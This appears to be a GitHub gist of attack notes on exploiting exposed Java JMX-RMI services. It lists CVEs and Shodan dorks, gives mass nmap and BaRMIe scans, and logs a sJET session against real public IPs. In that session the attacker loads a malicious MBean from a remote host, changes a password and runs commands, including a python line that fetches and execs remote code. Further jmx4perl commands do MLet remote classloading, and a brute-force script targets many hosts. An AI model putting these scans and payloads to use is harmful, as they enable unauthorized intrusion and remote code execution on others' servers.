
https://gist.github.com/dinosn/226a1a41ab7abbb060c623270ae6841b
##
##



Exploit JMX-RMI
======================

[search?query=X-Blackboard-product%3A+Blackboard+Learn](https://www.shodan.io/search?query=X-Blackboard-product%3A+Blackboard+Learn)

| Application                                 	| CVE                                                                             	| Infos                                                                                                                                 	| Port      	|
|---------------------------------------------	|---------------------------------------------------------------------------------	|---------------------------------------------------------------------------------------------------------------------------------------	|-----------	|
| APACHE CASSANDRA 3.8 / ZooKEEPER            	| [CVE-2018-8016](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8016)   	| [LINK](https://lists.apache.org/thread.html/bafb9060bbdf958a1c15ba66c68531116fba4a83858a2796254da066@%3Cuser.cassandra.apache.org%3E) 	| 7199      	|
| NICE ENGAGE PLATFORM <= 6.5                 	| [CVE-2019-7727](http://cve.mitre.org/cgi-bin/cvename.cgi?name=2019-7727)        	|                                                                                                                                       	| 6338      	|
| CISCO UNIFIED CUSTOMER VOICE PORTAL <= 11.x 	|                                                                                 	| [LINK](https://quickview.cloudapps.cisco.com/quickview/bug/CSCvi31075)                                                                	| 2098 2099 	|
| NASDAQ BWISE <= 5.x                         	| [CVE-2018-11247](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11247) 	| [LINK](https://packetstormsecurity.com/files/148918/Nasdaq-BWise-5.0-JMX-RMI-Interface-Remote-Code-Execution.html)                    	| 81        	|


* Bypass with LDAP & JRMP [LINK](https://www.bishopfox.com/news/2019/02/openmrs-insecure-object-deserialization/)
* Modifed BaRMIe [LINK](https://bitbucket.org/cable-miner/barmi-mod/src/master/)
* More infos: CH/ENG [blog.sari3l.com](https://translate.google.com/translate?hl=de&sl=auto&tl=de&u=https%3A%2F%2Fblog.sari3l.com)



* easy SSL/Proxy bypass with [jolokia](https://jolokia.org/reference/html/index.html)
* [Example/Script.pl](https://raw.githubusercontent.com/rhuss/jmx4perl/master/examples/remote.pl)
* [ysoserial-0.5-mod.jar](https://jitpack.io/com/github/imjustanoob/ysoserial/v0.0.5/ysoserial-v0.0.5.jar)
* [2017-tricking-java-serialization-for-a-treat](https://securitycafe.ro/2017/11/03/tricking-java-serialization-for-a-treat/)
* [Exploit-tomcat-over-jmx](https://www.nccgroup.trust/de/uber-uns/newsroom-and-events/blogs/2017/february/compromising-apache-tomcat-via-jmx-access/)
* 

* Example: http://172.93.48.216:9000/jolokia/

Vuln-Scan
------------
* Nmap : `nmap --append-output -oX $HOME/Scans/nmap-new.xml --open -Pn -p 2010,8009,1098,4444,7001,99,1030,1035,1090,1098,1099,1100,1101,1102,1103,1129,1199,1234,1440,2199,2809,3273,3333,3900,5520,5521,5580,5999,6060,6789,6996,7700,7800,7801,7878,7890,8050,8051,8085,8091,8205,8303,8642,8686,8701,8889,8890,8901,8902,8903,8999,9001,9003,9004,9005,9050,9099,9300,9500,9711,9809,9810,9811,9812,9813,9814,9815,9875,9910,9991,10098,10099,10162,11001,11099,11333,12000,13013,14000,15000,15001,15200,16000,17200,18980,20000,23791,26256,31099,32913,33000,37718,45230,47001,47002,50050,50500,50501,50502,50503,50504 --version-all -sV --script='jdwp-info,rmi-*' -iL /tmp/jboss-good -v`

* Parse Output for BaRMIe

    
        $ cat output.grep | awk '/open/{print $2 " " $4 ""$5}' | grep "Java" | sed -r 's/Ports://g' | sed -r 's/\/open.+//g' 
        34.244.233.112 1099
        177.85.202.230 1099
        177.32.207.218 1099
        [....]
        
        
* BaRMIe Scan:


        $ java -jar ~/bin/BaRMIe_v1.01.jar --targets /tmp/mx | grep -v "An exception" -2 > ~/Scans/BaRMIe.log
        
        $ cat ~/Scans/BaRMIe.log| grep "javax.management.remote.rmi.RMIServerImpl_Stub" -9 | egrep --only-matching "t ([0-9]{1,4}\.[0-9]{1,4}\.[0-9]{1,4}\.[0-9]{1,4}:[0-9]{1,6})|Name:(.*)" | xargs | sed -r 's/t /\n\.\/sjet-install.sh /g' | sed -r 's/[ ]?Name:[ ]?/ /' | egrep '[0-9]{1,4}\.[0-9]{1,4}\.[0-9]{1,4}\.[0-9]{1,4}' | sed -r 's/roo$/root/g'
        ./sjet-install.sh 3.121.223.231:1099 karaf-root
        ./sjet-install.sh 188.40.110.130:1099 jmxrmi 
        ./sjet-install.sh 136.243.36.142:1099 jmxrmi 
        [....]
        
Sjet-Hack
-----------
* Hacking with modifed Sjet


        % ./sjet-install.sh 159.69.178.36:1099 jmxrmi         
        sJET - siberas JMX Exploitation Toolkit
        =======================================
        [+] Connecting to: service:jmx:rmi:///jndi/rmi://159.69.178.36:1099/jmxrmi
        2019-03-16 06:53:59+0100 [-] Connection made to RedirectRx
        [+] Connected: rmi://185.189.112.19  1
        [+] Loaded javax.management.loading.MLet
        [+] Loading malicious MBean from http://162.210.173.220:8080/mlet/
        [+] Invoking: javax.management.loading.MLet.getMBeansFromURL
        [+] Successfully loaded MBeanSiberas:name=payload,id=1
        [+] Changing default password...
        [+] Loaded de.siberas.lab.SiberasPayload
        [+] Successfully changed password

        sJET - siberas JMX Exploitation Toolkit
        =======================================
        [+] Connecting to: service:jmx:rmi:///jndi/rmi://159.69.178.36:1099/jmxrmi
        2019-03-16 06:54:08+0100 [-] Connection made to RedirectRx
        [+] Connected: rmi://185.189.112.19  2
        [+] Loaded de.siberas.lab.SiberasPayload
        [+] Executing command: whoami && dir
        bds
        backend-service.conf                    heapdump.20190225.131401.1166.0011.phd
        backend-service.jar                     javacore.20190214.090232.1167.0005.txt
        backend-service-previous.jar            javacore.20190214.090232.1167.0006.txt
        core.20190214.090232.1167.0001.dmp      javacore.20190214.090232.1167.0007.txt
        core.20190225.130541.1166.0001.dmp      javacore.20190214.090544.1167.0011.txt
        dynatrace-7.2                           javacore.20190225.130541.1166.0003.txt
        fridge-service.conf                     javacore.20190225.131330.1166.0007.txt
        fridge-service.jar                      javacore.20190225.131330.1166.0008.txt
        fridge-service-previous.jar             javacore.20190225.131401.1166.0012.txt
        heapdump.20190214.090232.1167.0002.phd  Snap.20190214.090232.1167.0008.trc
        heapdump.20190214.090232.1167.0003.phd  Snap.20190214.090232.1167.0010.trc
        heapdump.20190214.090232.1167.0004.phd  Snap.20190214.090544.1167.0013.trc
        heapdump.20190214.090544.1167.0012.phd  Snap.20190225.130541.1166.0004.trc
        heapdump.20190225.130541.1166.0002.phd  Snap.20190225.131330.1166.0009.trc
        heapdump.20190225.131330.1166.0005.phd  Snap.20190225.131330.1166.0010.trc
        heapdump.20190225.131330.1166.0006.phd  Snap.20190225.131415.1166.0013.trc


        [+] Done
        sJET - siberas JMX Exploitation Toolkit
        =======================================
        [+] Connecting to: service:jmx:rmi:///jndi/rmi://159.69.178.36:1099/jmxrmi
        2019-03-16 06:54:15+0100 [-] Connection made to RedirectRx
        [+] Connected: rmi://185.189.112.19  3
        [+] Use command 'exit_shell' to exit the shell
        >>> 
        [+] Loaded de.siberas.lab.SiberasPayload
        [+] Executing command: 


        >>> python -c "import urllib;exec urllib.urlopen(''http://konde.diskstation.me:8000/dead/oUxhFeeJe8'').read()"
        [+] Loaded de.siberas.lab.SiberasPayload
        [+] Executing command: python -c "import urllib;exec urllib.urlopen(''http://konde.diskstation.me:8000/dead/oUxhFeeJe8'').read()"


        >>> python -c "import urllib;exec urllib.urlopen('http://konde.diskstation.me:8000/dead/oUxhFeeJe8').read()"
        [+] Loaded de.siberas.lab.SiberasPayload
        [+] Executing command: python -c "import urllib;exec urllib.urlopen('http://konde.diskstation.me:8000/dead/oUxhFeeJe8').read()"




Install 
-----------


    cpanm install -n Term::ReadKey 
    cpanm PJB/Term-Clui-1.70.tar.gz
    cpanm install \
    JSON::XS \
    Term::ReadLine::Gnu \
    LWP::Protocol::https \
    XML::LibXML
    cpanm -nf JMX::Jmx4Perl 

SSL/Proxy Bypass
--------------------
* Easy with [jolokia](https://jolokia.org/reference/html/index.html)

      jmx4perl 'http://172.93.48.216:9000/jolokia' --target service:jmx:rmi:///jndi/rmi://221.228.205.175:1099/jmxrmi list   

* Check for "jmxrmi" exploit

      jmx4perl 'http://172.93.48.216:9000/jolokia' --target service:jmx:rmi:///jndi/rmi://94.130.168.200:1099/jmxrmi list DefaultDomain:type=MLet

* Remote Java Classloading with MLet

      jmx4perl "http://172.17.0.1:8088/jolokia" --target 'service:jmx:rmi:///jndi/rmi://112.74.22.227:1099/jmxrmi' exec 'DefaultDomain:type=MLet' 'getMBeansFromURL(java.lang.String)' "http://162.210.173.220:8080/mlet/"
      
Jolokia
-------------

* More infos: [LINK](https://translate.googleusercontent.com/translate_c?depth=1&rurl=translate.google.de&sl=auto&sp=nmt4&tl=de&u=https://www.javasec.cn/index.php/archives/124/&xid=17259,1500001,15700023,15700186,15700190,15700248,15700253&usg=ALkJrhh29QlLhfeTlYfgSPx1yW5WbhoF4A)


Div
--------
* Some handy alias

      alias jmx4perl="docker run --rm -it -v ~/.j4p:/root/.j4p jolokia/jmx4perl jmx4perl"
      alias jolokia="docker run --rm -it -v `pwd`:/jolokia jolokia/jmx4perl jolokia"
      alias j4psh="docker run --rm -it -v ~/.j4p:/root/.j4p jolokia/jmx4perl j4psh"
      
      
BaRMI
------------
      
    cat /tmp/msf-db-rhosts-20181029-13031-1cy0tl6 | parallel brut-rmi {}:1099 2


JMS
-----------------
* [JMSDigger](https://jitpack.io/com/github/OpenSecurityResearch/jmsdigger/master/jmsdigger-master.jar)


Attack JMX/RMI/JNDI
--------------------
* [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](2016-PWN-java)
* [https://www.owasp.org/images/d/d7/Marshaller_Deserialization_Attacks.pdf.pdf](2017-Pwn-Java-with-LDAP-JDNI)

* [marshalsec-nomakro](https://jitpack.io/com/github/no-sec-marko/marshalsec/master-9f98889533-1/marshalsec-master-9f98889533-1.jar)
* [marshalsec-api](https://jitpack.io/com/github/no-sec-marko/marshalsec/api-9a8acb71cf-1/marshalsec-api-9a8acb71cf-1.jar)
* [More-infos-for-LDAP](https://blog.gdssecurity.com/labs/2018/4/18/jolokia-vulnerabilities-rce-xss.html)

* "starting with Java 11.0.1 and 8u191, directly getting remote code execution from JNDI lookups and related operations should no longer be possible. What however still is possible to get a Java Deserialization from these calls (both via RMI and LDAP)." [https://mbechler.github.io/2018/11/01/Java-CVE-2018-3149/](Link)




CVE-2017-12149 JBOOS AS 6.X
--------
More Infos: [Link](http://www.cnblogs.com/sevck/p/7874438.html)
Dork: [Shodan](https://www.shodan.io/search?query=%22JBossAS%22+country%3Ade)
intitle:"Welcome to JBoss AS"
      
